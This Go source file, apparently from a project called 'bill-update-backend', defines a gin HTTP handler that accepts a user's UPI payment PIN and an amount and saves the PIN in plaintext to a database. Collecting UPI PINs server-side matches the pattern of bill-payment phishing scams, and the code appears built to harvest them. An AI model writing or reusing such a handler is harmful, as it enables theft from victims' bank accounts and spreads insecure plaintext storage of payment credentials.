package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"

	"github.com/gin-gonic/gin"
)

func SubmitUpiPin(c *gin.Context) {
	var req struct {
		Pin    string  `json:"pin"`
		Amount float64 `json:"amount"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	record := models.UpiDetail{
		Pin:    req.Pin,
		Amount: req.Amount,
	}
	database.DB.Create(&record)
	c.JSON(http.StatusOK, gin.H{"message": "UPI pin saved", "id": record.ID})
}
